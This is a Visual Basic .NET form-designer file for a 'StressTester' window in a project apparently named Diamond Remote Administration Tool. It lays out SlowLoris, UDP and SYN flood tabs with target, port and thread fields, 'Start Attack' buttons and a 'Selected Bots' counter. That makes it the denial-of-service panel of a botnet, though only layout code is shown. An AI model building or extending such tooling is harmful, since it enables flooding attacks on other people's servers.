<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()> _
Partial Class StressTester
    Inherits System.Windows.Forms.Form

    'Das Formular überschreibt den Löschvorgang, um die Komponentenliste zu bereinigen.
    <System.Diagnostics.DebuggerNonUserCode()> _
    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
        Try
            If disposing AndAlso components IsNot Nothing Then
                components.Dispose()
            End If
        Finally
            MyBase.Dispose(disposing)
        End Try
    End Sub

    'Wird vom Windows Form-Designer benötigt.
    Private components As System.ComponentModel.IContainer

    'Hinweis: Die folgende Prozedur ist für den Windows Form-Designer erforderlich.
    'Das Bearbeiten ist mit dem Windows Form-Designer möglich.  
    'Das Bearbeiten mit dem Code-Editor ist nicht möglich.
    <System.Diagnostics.DebuggerStepThrough()> _
    Private Sub InitializeComponent()
        Dim resources As System.ComponentModel.ComponentResourceManager = New System.ComponentModel.ComponentResourceManager(GetType(StressTester))
        Me.Label1 = New System.Windows.Forms.Label()
        Me.tb_slurl = New System.Windows.Forms.TextBox()
        Me.Label2 = New System.Windows.Forms.Label()
        Me.NUD_AoS_Sl = New System.Windows.Forms.NumericUpDown()
        Me.Label3 = New System.Windows.Forms.Label()
        Me.NUD_AOT_SL = New System.Windows.Forms.NumericUpDown()
        Me.btn_startsl = New System.Windows.Forms.Button()
        Me.btn_stopsl = New System.Windows.Forms.Button()
        Me.StatusStrip1 = New System.Windows.Forms.StatusStrip()
        Me.ToolStripStatusLabel1 = New System.Windows.Forms.ToolStripStatusLabel()
        Me.ToolStripStatusLabel2 = New System.Windows.Forms.ToolStripStatusLabel()
        Me.CodePlexTabControl1 = New Diamond_Remote_Administration_Tool.CodePlexTabControl()
        Me.TabPage1 = New System.Windows.Forms.TabPage()
        Me.TabPage2 = New System.Windows.Forms.TabPage()
        Me.Label8 = New System.Windows.Forms.Label()
        Me.NUD_AOT_UDP = New System.Windows.Forms.NumericUpDown()
        Me.tb_portudp = New System.Windows.Forms.NumericUpDown()
        Me.Label5 = New System.Windows.Forms.Label()
        Me.btn_stop2 = New System.Windows.Forms.Button()
        Me.btn_start2 = New System.Windows.Forms.Button()
        Me.Label4 = New System.Windows.Forms.Label()
        Me.tb_ipudp = New System.Windows.Forms.TextBox()
        Me.TabPage3 = New System.Windows.Forms.TabPage()
        Me.Label10 = New System.Windows.Forms.Label()
        Me.NUD_AOS_SYN = New System.Windows.Forms.NumericUpDown()
        Me.Label11 = New System.Windows.Forms.Label()
        Me.NUD_AOT_SYN = New System.Windows.Forms.NumericUpDown()
        Me.tb_portsyn = New System.Windows.Forms.NumericUpDown()
        Me.Label6 = New System.Windows.Forms.Label()
        Me.btn_stop3 = New System.Windows.Forms.Button()
        Me.btn_start3 = New System.Windows.Forms.Button()
        Me.Label7 = New System.Windows.Forms.Label()
        Me.tb_ipsyn = New System.Windows.Forms.TextBox()
        CType(Me.NUD_AoS_Sl, System.ComponentModel.ISupportInitialize).BeginInit()
        CType(Me.NUD_AOT_SL, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.StatusStrip1.SuspendLayout()
        Me.CodePlexTabControl1.SuspendLayout()
        Me.TabPage1.SuspendLayout()
        Me.TabPage2.SuspendLayout()
        CType(Me.NUD_AOT_UDP, System.ComponentModel.ISupportInitialize).BeginInit()
        CType(Me.tb_portudp, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.TabPage3.SuspendLayout()
        CType(Me.NUD_AOS_SYN, System.ComponentModel.ISupportInitialize).BeginInit()
        CType(Me.NUD_AOT_SYN, System.ComponentModel.ISupportInitialize).BeginInit()
        CType(Me.tb_portsyn, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.SuspendLayout()
        '
        'Label1
        '
        Me.Label1.AutoSize = True
        Me.Label1.Font = New System.Drawing.Font("Microsoft Sans Serif", 9.0!)
        Me.Label1.Location = New System.Drawing.Point(7, 24)
        Me.Label1.Name = "Label1"
        Me.Label1.Size = New System.Drawing.Size(118, 15)
        Me.Label1.TabIndex = 0
        Me.Label1.Text = "URL or Host-Name: "
        '
        'tb_slurl
        '
        Me.tb_slurl.Font = New System.Drawing.Font("Microsoft Sans Serif", 9.0!)
        Me.tb_slurl.Location = New System.Drawing.Point(158, 21)
        Me.tb_slurl.Name = "tb_slurl"
        Me.tb_slurl.Size = New System.Drawing.Size(261, 21)
        Me.tb_slurl.TabIndex = 1
        Me.tb_slurl.Text = "http://example.com"
        '
        'Label2
        '
        Me.Label2.AutoSize = True
        Me.Label2.Font = New System.Drawing.Font("Microsoft Sans Serif", 9.0!)
        Me.Label2.Location = New System.Drawing.Point(7, 60)
        Me.Label2.Name = "Label2"
        Me.Label2.Size = New System.Drawing.Size(109, 15)
        Me.Label2.TabIndex = 2
        Me.Label2.Text = "Socks per Thread: "
        '
        'NUD_AoS_Sl
        '
        Me.NUD_AoS_Sl.Location = New System.Drawing.Point(158, 60)
        Me.NUD_AoS_Sl.Name = "NUD_AoS_Sl"
        Me.NUD_AoS_Sl.Size = New System.Drawing.Size(261, 25)
        Me.NUD_AoS_Sl.TabIndex = 3
        Me.NUD_AoS_Sl.Value = New Decimal(New Integer() {100, 0, 0, 0})
        '
        'Label3
        '
        Me.Label3.AutoSize = True
        Me.Label3.Font = New System.Drawing.Font("Microsoft Sans Serif", 9.0!)
        Me.Label3.Location = New System.Drawing.Point(7, 94)
        Me.Label3.Name = "Label3"
        Me.Label3.Size = New System.Drawing.Size(116, 15)
        Me.Label3.TabIndex = 4
        Me.Label3.Text = "Amount of Threads: "
        '
        'NUD_AOT_SL
        '
        Me.NUD_AOT_SL.Location = New System.Drawing.Point(158, 91)
        Me.NUD_AOT_SL.Maximum = New Decimal(New Integer() {150, 0, 0, 0})
        Me.NUD_AOT_SL.Name = "NUD_AOT_SL"
        Me.NUD_AOT_SL.Size = New System.Drawing.Size(261, 25)
        Me.NUD_AOT_SL.TabIndex = 5
        Me.NUD_AOT_SL.Value = New Decimal(New Integer() {70, 0, 0, 0})
        '
        'btn_startsl
        '
        Me.btn_startsl.Location = New System.Drawing.Point(234, 132)
        Me.btn_startsl.Name = "btn_startsl"
        Me.btn_startsl.Size = New System.Drawing.Size(89, 28)
        Me.btn_startsl.TabIndex = 8
        Me.btn_startsl.Text = "Start Attack"
        Me.btn_startsl.UseVisualStyleBackColor = True
        '
        'btn_stopsl
        '
        Me.btn_stopsl.Location = New System.Drawing.Point(329, 132)
        Me.btn_stopsl.Name = "btn_stopsl"
        Me.btn_stopsl.Size = New System.Drawing.Size(90, 28)
        Me.btn_stopsl.TabIndex = 9
        Me.btn_stopsl.Text = "Stop Attack"
        Me.btn_stopsl.UseVisualStyleBackColor = True
        '
        'StatusStrip1
        '
        Me.StatusStrip1.BackColor = System.Drawing.Color.White
        Me.StatusStrip1.Items.AddRange(New System.Windows.Forms.ToolStripItem() {Me.ToolStripStatusLabel1, Me.ToolStripStatusLabel2})
        Me.StatusStrip1.Location = New System.Drawing.Point(0, 218)
        Me.StatusStrip1.Name = "StatusStrip1"
        Me.StatusStrip1.Size = New System.Drawing.Size(438, 22)
        Me.StatusStrip1.TabIndex = 10
        Me.StatusStrip1.Text = "StatusStrip1"
        '
        'ToolStripStatusLabel1
        '
        Me.ToolStripStatusLabel1.Name = "ToolStripStatusLabel1"
        Me.ToolStripStatusLabel1.Size = New System.Drawing.Size(89, 17)
        Me.ToolStripStatusLabel1.Text = "Selected Bots: 0"
        '
        'ToolStripStatusLabel2
        '
        Me.ToolStripStatusLabel2.ForeColor = System.Drawing.Color.Red
        Me.ToolStripStatusLabel2.Name = "ToolStripStatusLabel2"
        Me.ToolStripStatusLabel2.Size = New System.Drawing.Size(274, 17)
        Me.ToolStripStatusLabel2.Text = "Note: You might lose bots due the high bandwith !"
        '
        'CodePlexTabControl1
        '
        Me.CodePlexTabControl1.Controls.Add(Me.TabPage1)
        Me.CodePlexTabControl1.Controls.Add(Me.TabPage2)
        Me.CodePlexTabControl1.Controls.Add(Me.TabPage3)
        Me.CodePlexTabControl1.DrawMode = System.Windows.Forms.TabDrawMode.OwnerDrawFixed
        Me.CodePlexTabControl1.Font = New System.Drawing.Font("Segoe UI", 10.0!)
        Me.CodePlexTabControl1.ItemSize = New System.Drawing.Size(140, 41)
        Me.CodePlexTabControl1.Location = New System.Drawing.Point(1, 2)
        Me.CodePlexTabControl1.Name = "CodePlexTabControl1"
        Me.CodePlexTabControl1.SelectedIndex = 0
        Me.CodePlexTabControl1.Size = New System.Drawing.Size(433, 215)
        Me.CodePlexTabControl1.SizeMode = System.Windows.Forms.TabSizeMode.Fixed
        Me.CodePlexTabControl1.TabIndex = 12
        '
        'TabPage1
        '
        Me.TabPage1.Controls.Add(Me.Label1)
        Me.TabPage1.Controls.Add(Me.tb_slurl)
        Me.TabPage1.Controls.Add(Me.btn_stopsl)
        Me.TabPage1.Controls.Add(Me.Label2)
        Me.TabPage1.Controls.Add(Me.btn_startsl)
        Me.TabPage1.Controls.Add(Me.NUD_AoS_Sl)
        Me.TabPage1.Controls.Add(Me.Label3)
        Me.TabPage1.Controls.Add(Me.NUD_AOT_SL)
        Me.TabPage1.Location = New System.Drawing.Point(4, 45)
        Me.TabPage1.Name = "TabPage1"
        Me.TabPage1.Padding = New System.Windows.Forms.Padding(3)
        Me.TabPage1.Size = New System.Drawing.Size(425, 166)
        Me.TabPage1.TabIndex = 0
        Me.TabPage1.Text = "SlowLoris"
        Me.TabPage1.UseVisualStyleBackColor = True
        '
        'TabPage2
        '
        Me.TabPage2.Controls.Add(Me.Label8)
        Me.TabPage2.Controls.Add(Me.NUD_AOT_UDP)
        Me.TabPage2.Controls.Add(Me.tb_portudp)
        Me.TabPage2.Controls.Add(Me.Label5)
        Me.TabPage2.Controls.Add(Me.btn_stop2)
        Me.TabPage2.Controls.Add(Me.btn_start2)
        Me.TabPage2.Controls.Add(Me.Label4)
        Me.TabPage2.Controls.Add(Me.tb_ipudp)
        Me.TabPage2.Location = New System.Drawing.Point(4, 45)
        Me.TabPage2.Name = "TabPage2"
        Me.TabPage2.Padding = New System.Windows.Forms.Padding(3)
        Me.TabPage2.Size = New System.Drawing.Size(425, 166)
        Me.TabPage2.TabIndex = 1
        Me.TabPage2.Text = "UDP"
        Me.TabPage2.UseVisualStyleBackColor = True
        '
        'Label8
        '
        Me.Label8.AutoSize = True
        Me.Label8.Font = New System.Drawing.Font("Microsoft Sans Serif", 9.0!)
        Me.Label8.Location = New System.Drawing.Point(7, 99)
        Me.Label8.Name = "Label8"
        Me.Label8.Size = New System.Drawing.Size(116, 15)
        Me.Label8.TabIndex = 25
        Me.Label8.Text = "Amount of Threads: "
        '
        'NUD_AOT_UDP
        '
        Me.NUD_AOT_UDP.Location = New System.Drawing.Point(129, 96)
        Me.NUD_AOT_UDP.Maximum = New Decimal(New Integer() {150, 0, 0, 0})
        Me.NUD_AOT_UDP.Name = "NUD_AOT_UDP"
        Me.NUD_AOT_UDP.Size = New System.Drawing.Size(290, 25)
        Me.NUD_AOT_UDP.TabIndex = 26
        Me.NUD_AOT_UDP.Value = New Decimal(New Integer() {70, 0, 0, 0})
        '
        'tb_portudp
        '
        Me.tb_portudp.Location = New System.Drawing.Point(129, 58)
        Me.tb_portudp.Maximum = New Decimal(New Integer() {65535, 0, 0, 0})
        Me.tb_portudp.Name = "tb_portudp"
        Me.tb_portudp.Size = New System.Drawing.Size(290, 25)
        Me.tb_portudp.TabIndex = 13
        Me.tb_portudp.Value = New Decimal(New Integer() {53, 0, 0, 0})
        '
        'Label5
        '
        Me.Label5.AutoSize = True
        Me.Label5.Font = New System.Drawing.Font("Microsoft Sans Serif", 9.0!)
        Me.Label5.Location = New System.Drawing.Point(7, 61)
        Me.Label5.Name = "Label5"
        Me.Label5.Size = New System.Drawing.Size(35, 15)
        Me.Label5.TabIndex = 12
        Me.Label5.Text = "Port: "
        '
        'btn_stop2
        '
        Me.btn_stop2.Location = New System.Drawing.Point(329, 132)
        Me.btn_stop2.Name = "btn_stop2"
        Me.btn_stop2.Size = New System.Drawing.Size(90, 28)
        Me.btn_stop2.TabIndex = 11
        Me.btn_stop2.Text = "Stop Attack"
        Me.btn_stop2.UseVisualStyleBackColor = True
        '
        'btn_start2
        '
        Me.btn_start2.Location = New System.Drawing.Point(234, 132)
        Me.btn_start2.Name = "btn_start2"
        Me.btn_start2.Size = New System.Drawing.Size(89, 28)
        Me.btn_start2.TabIndex = 10
        Me.btn_start2.Text = "Start Attack"
        Me.btn_start2.UseVisualStyleBackColor = True
        '
        'Label4
        '
        Me.Label4.AutoSize = True
        Me.Label4.Font = New System.Drawing.Font("Microsoft Sans Serif", 9.0!)
        Me.Label4.Location = New System.Drawing.Point(7, 24)
        Me.Label4.Name = "Label4"
        Me.Label4.Size = New System.Drawing.Size(65, 15)
        Me.Label4.TabIndex = 2
        Me.Label4.Text = "IP-Adress: "
        '
        'tb_ipudp
        '
        Me.tb_ipudp.Font = New System.Drawing.Font("Microsoft Sans Serif", 9.0!)
        Me.tb_ipudp.Location = New System.Drawing.Point(129, 21)
        Me.tb_ipudp.Name = "tb_ipudp"
        Me.tb_ipudp.Size = New System.Drawing.Size(290, 21)
        Me.tb_ipudp.TabIndex = 3
        Me.tb_ipudp.Text = "Example: 192.168.178.1"
        '
        'TabPage3
        '
        Me.TabPage3.Controls.Add(Me.Label10)
        Me.TabPage3.Controls.Add(Me.NUD_AOS_SYN)
        Me.TabPage3.Controls.Add(Me.Label11)
        Me.TabPage3.Controls.Add(Me.NUD_AOT_SYN)
        Me.TabPage3.Controls.Add(Me.tb_portsyn)
        Me.TabPage3.Controls.Add(Me.Label6)
        Me.TabPage3.Controls.Add(Me.btn_stop3)
        Me.TabPage3.Controls.Add(Me.btn_start3)
        Me.TabPage3.Controls.Add(Me.Label7)
        Me.TabPage3.Controls.Add(Me.tb_ipsyn)
        Me.TabPage3.Location = New System.Drawing.Point(4, 45)
        Me.TabPage3.Name = "TabPage3"
        Me.TabPage3.Size = New System.Drawing.Size(425, 166)
        Me.TabPage3.TabIndex = 2
        Me.TabPage3.Text = "SYN"
        Me.TabPage3.UseVisualStyleBackColor = True
        '
        'Label10
        '
        Me.Label10.AutoSize = True
        Me.Label10.Font = New System.Drawing.Font("Microsoft Sans Serif", 9.0!)
        Me.Label10.Location = New System.Drawing.Point(7, 60)
        Me.Label10.Name = "Label10"
        Me.Label10.Size = New System.Drawing.Size(109, 15)
        Me.Label10.TabIndex = 21
        Me.Label10.Text = "Socks per Thread: "
        '
        'NUD_AOS_SYN
        '
        Me.NUD_AOS_SYN.Location = New System.Drawing.Point(158, 60)
        Me.NUD_AOS_SYN.Name = "NUD_AOS_SYN"
        Me.NUD_AOS_SYN.Size = New System.Drawing.Size(261, 25)
        Me.NUD_AOS_SYN.TabIndex = 22
        Me.NUD_AOS_SYN.Value = New Decimal(New Integer() {100, 0, 0, 0})
        '
        'Label11
        '
        Me.Label11.AutoSize = True
        Me.Label11.Font = New System.Drawing.Font("Microsoft Sans Serif", 9.0!)
        Me.Label11.Location = New System.Drawing.Point(7, 94)
        Me.Label11.Name = "Label11"
        Me.Label11.Size = New System.Drawing.Size(116, 15)
        Me.Label11.TabIndex = 23
        Me.Label11.Text = "Amount of Threads: "
        '
        'NUD_AOT_SYN
        '
        Me.NUD_AOT_SYN.Location = New System.Drawing.Point(158, 91)
        Me.NUD_AOT_SYN.Maximum = New Decimal(New Integer() {150, 0, 0, 0})
        Me.NUD_AOT_SYN.Name = "NUD_AOT_SYN"
        Me.NUD_AOT_SYN.Size = New System.Drawing.Size(261, 25)
        Me.NUD_AOT_SYN.TabIndex = 24
        Me.NUD_AOT_SYN.Value = New Decimal(New Integer() {70, 0, 0, 0})
        '
        'tb_portsyn
        '
        Me.tb_portsyn.Location = New System.Drawing.Point(320, 20)
        Me.tb_portsyn.Maximum = New Decimal(New Integer() {65535, 0, 0, 0})
        Me.tb_portsyn.Name = "tb_portsyn"
        Me.tb_portsyn.Size = New System.Drawing.Size(99, 25)
        Me.tb_portsyn.TabIndex = 19
        Me.tb_portsyn.Value = New Decimal(New Integer() {53, 0, 0, 0})
        '
        'Label6
        '
        Me.Label6.AutoSize = True
        Me.Label6.Font = New System.Drawing.Font("Microsoft Sans Serif", 9.0!)
        Me.Label6.Location = New System.Drawing.Point(279, 24)
        Me.Label6.Name = "Label6"
        Me.Label6.Size = New System.Drawing.Size(35, 15)
        Me.Label6.TabIndex = 18
        Me.Label6.Text = "Port: "
        '
        'btn_stop3
        '
        Me.btn_stop3.Location = New System.Drawing.Point(329, 132)
        Me.btn_stop3.Name = "btn_stop3"
        Me.btn_stop3.Size = New System.Drawing.Size(90, 28)
        Me.btn_stop3.TabIndex = 17
        Me.btn_stop3.Text = "Stop Attack"
        Me.btn_stop3.UseVisualStyleBackColor = True
        '
        'btn_start3
        '
        Me.btn_start3.Location = New System.Drawing.Point(234, 132)
        Me.btn_start3.Name = "btn_start3"
        Me.btn_start3.Size = New System.Drawing.Size(89, 28)
        Me.btn_start3.TabIndex = 16
        Me.btn_start3.Text = "Start Attack"
        Me.btn_start3.UseVisualStyleBackColor = True
        '
        'Label7
        '
        Me.Label7.AutoSize = True
        Me.Label7.Font = New System.Drawing.Font("Microsoft Sans Serif", 9.0!)
        Me.Label7.Location = New System.Drawing.Point(7, 24)
        Me.Label7.Name = "Label7"
        Me.Label7.Size = New System.Drawing.Size(65, 15)
        Me.Label7.TabIndex = 14
        Me.Label7.Text = "IP-Adress: "
        '
        'tb_ipsyn
        '
        Me.tb_ipsyn.Font = New System.Drawing.Font("Microsoft Sans Serif", 9.0!)
        Me.tb_ipsyn.Location = New System.Drawing.Point(78, 21)
        Me.tb_ipsyn.Name = "tb_ipsyn"
        Me.tb_ipsyn.Size = New System.Drawing.Size(195, 21)
        Me.tb_ipsyn.TabIndex = 15
        Me.tb_ipsyn.Text = "Example: 192.168.178.1"
        '
        'StressTester
        '
        Me.AutoScaleDimensions = New System.Drawing.SizeF(6.0!, 13.0!)
        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
        Me.ClientSize = New System.Drawing.Size(438, 240)
        Me.Controls.Add(Me.CodePlexTabControl1)
        Me.Controls.Add(Me.StatusStrip1)
        Me.Icon = CType(resources.GetObject("$this.Icon"), System.Drawing.Icon)
        Me.MaximumSize = New System.Drawing.Size(454, 279)
        Me.MinimumSize = New System.Drawing.Size(454, 279)
        Me.Name = "StressTester"
        Me.Text = "StressTester"
        CType(Me.NUD_AoS_Sl, System.ComponentModel.ISupportInitialize).EndInit()
        CType(Me.NUD_AOT_SL, System.ComponentModel.ISupportInitialize).EndInit()
        Me.StatusStrip1.ResumeLayout(False)
        Me.StatusStrip1.PerformLayout()
        Me.CodePlexTabControl1.ResumeLayout(False)
        Me.TabPage1.ResumeLayout(False)
        Me.TabPage1.PerformLayout()
        Me.TabPage2.ResumeLayout(False)
        Me.TabPage2.PerformLayout()
        CType(Me.NUD_AOT_UDP, System.ComponentModel.ISupportInitialize).EndInit()
        CType(Me.tb_portudp, System.ComponentModel.ISupportInitialize).EndInit()
        Me.TabPage3.ResumeLayout(False)
        Me.TabPage3.PerformLayout()
        CType(Me.NUD_AOS_SYN, System.ComponentModel.ISupportInitialize).EndInit()
        CType(Me.NUD_AOT_SYN, System.ComponentModel.ISupportInitialize).EndInit()
        CType(Me.tb_portsyn, System.ComponentModel.ISupportInitialize).EndInit()
        Me.ResumeLayout(False)
        Me.PerformLayout()

    End Sub
    Friend WithEvents Label1 As System.Windows.Forms.Label
    Friend WithEvents tb_slurl As System.Windows.Forms.TextBox
    Friend WithEvents Label2 As System.Windows.Forms.Label
    Friend WithEvents NUD_AoS_Sl As System.Windows.Forms.NumericUpDown
    Friend WithEvents Label3 As System.Windows.Forms.Label
    Friend WithEvents NUD_AOT_SL As System.Windows.Forms.NumericUpDown
    Friend WithEvents btn_startsl As System.Windows.Forms.Button
    Friend WithEvents btn_stopsl As System.Windows.Forms.Button
    Friend WithEvents StatusStrip1 As System.Windows.Forms.StatusStrip
    Friend WithEvents ToolStripStatusLabel1 As System.Windows.Forms.ToolStripStatusLabel
    Friend WithEvents CodePlexTabControl1 As Diamond_Remote_Administration_Tool.CodePlexTabControl
    Friend WithEvents TabPage1 As System.Windows.Forms.TabPage
    Friend WithEvents TabPage2 As System.Windows.Forms.TabPage
    Friend WithEvents TabPage3 As System.Windows.Forms.TabPage
    Friend WithEvents btn_stop2 As System.Windows.Forms.Button
    Friend WithEvents btn_start2 As System.Windows.Forms.Button
    Friend WithEvents Label4 As System.Windows.Forms.Label
    Friend WithEvents tb_ipudp As System.Windows.Forms.TextBox
    Friend WithEvents tb_portudp As System.Windows.Forms.NumericUpDown
    Friend WithEvents Label5 As System.Windows.Forms.Label
    Friend WithEvents tb_portsyn As System.Windows.Forms.NumericUpDown
    Friend WithEvents Label6 As System.Windows.Forms.Label
    Friend WithEvents btn_stop3 As System.Windows.Forms.Button
    Friend WithEvents btn_start3 As System.Windows.Forms.Button
    Friend WithEvents Label7 As System.Windows.Forms.Label
    Friend WithEvents tb_ipsyn As System.Windows.Forms.TextBox
    Friend WithEvents Label10 As System.Windows.Forms.Label
    Friend WithEvents NUD_AOS_SYN As System.Windows.Forms.NumericUpDown
    Friend WithEvents Label11 As System.Windows.Forms.Label
    Friend WithEvents NUD_AOT_SYN As System.Windows.Forms.NumericUpDown
    Friend WithEvents ToolStripStatusLabel2 As System.Windows.Forms.ToolStripStatusLabel
    Friend WithEvents Label8 As System.Windows.Forms.Label
    Friend WithEvents NUD_AOT_UDP As System.Windows.Forms.NumericUpDown
End Class
